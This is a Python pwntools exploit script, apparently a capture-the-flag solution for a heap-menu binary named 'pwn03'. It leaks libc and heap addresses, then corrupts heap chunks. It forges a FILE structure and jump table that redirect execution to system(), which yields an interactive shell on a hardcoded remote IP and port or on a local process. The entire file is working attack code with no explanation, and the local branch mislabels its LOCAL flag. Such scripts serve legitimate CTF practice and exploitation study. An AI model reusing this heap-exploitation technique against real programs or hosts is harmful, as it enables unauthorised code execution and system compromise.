#! /usr/bin/python2

from pwn import *
import sys


def exploit():
    gdb_command = '''
        breakrva 0xE74
        c
    '''
    alloc()
    alloc()
    alloc()
    alloc()
    remove(0)
    remove(2)
    alloc()
    show(0)
    r.recvuntil('Magic : ')
    raw = r.recvline()
    main_arena = int(raw) - 88
    if LOCAL:
        libc_addr = main_arena - 0x38cb20
        system_addr = libc_addr + 0x3d4a9
        io_list_all = libc_addr + 0x38d520
        malloc_hook = libc_addr + 0x38cb10
    else:
        libc_addr = main_arena - 0x3c4b20
        system_addr = libc_addr + 0x45390
        io_list_all = libc_addr + 0x3c5520
        malloc_hook = libc_addr + 0x3c4b10
    log.info('Libc addr: ' + hex(libc_addr))
    r.recvuntil('Content : ')
    raw = r.recv(6)
    heap_base = u64(raw.ljust(8, '\x00'))- 0x140
    log.info('Heap addr: ' + hex(heap_base))
    alloc()
    fake_heap = p64(heap_base + 0x1f0) + p64(heap_base + 0x1e0)
    edit(3, heap_base + 0x1e8, fake_heap.ljust(144 - 8, '\x00') + p64(0xa0))
    remove(2)
    alloc()

    edit(3, '0', p64(heap_base + 0xb0))
    alloc()
    fake_heap = p64(0xa1) + p64(main_arena + 88) * 2
    edit(1, 0, fake_heap)
    alloc()
    edit(2, 0, p64(0x21) + p64(0) * 3 + p64(0x21))
    remove(5)

    fake_jump_tb = heap_base + 0x1a8
    fake_file = p64(0x61) + p64(0) + p64(io_list_all - 0x10)
    fake_file += p64(0) + p64(1)
    edit(1, 0x6873, fake_file)
    fake_file = p64(0) * 6 + p64(fake_jump_tb) + p64(1) + p64(2) + p64(3) + p64(0) * 3 + p64(system_addr)
    # gdb.attach(r, gdb_command)
    edit(2, 0, fake_file)
    alloc()

    r.interactive()


def alloc():
    r.sendlineafter('YOUR CHOICE : ', '1')


def edit(idx, magic, content):
    r.sendlineafter('YOUR CHOICE : ', '2')
    r.sendlineafter('Index : ', str(idx))
    r.sendlineafter('Magic : ', str(magic))
    r.sendlineafter('Content : ', content)


def remove(idx):
    r.sendlineafter('YOUR CHOICE : ', '3')
    r.sendlineafter('Index : ', str(idx))


def show(idx):
    r.sendlineafter('YOUR CHOICE : ', '4')
    r.sendlineafter('Index : ', str(idx))


if __name__ == '__main__':
    context.terminal = ['gnome-terminal', '-e']
    if len(sys.argv) == 1:
        exit()
    if sys.argv[1] == 'remote':
        r = remote('18.136.126.78', 1336)
        LOCAL = False
    elif sys.argv[1] == 'local':
        r = process('./pwn03', env={'LD_PRELOAD': './libc-2.23.so'})
        LOCAL = False
    else:
        exit()
    exploit()
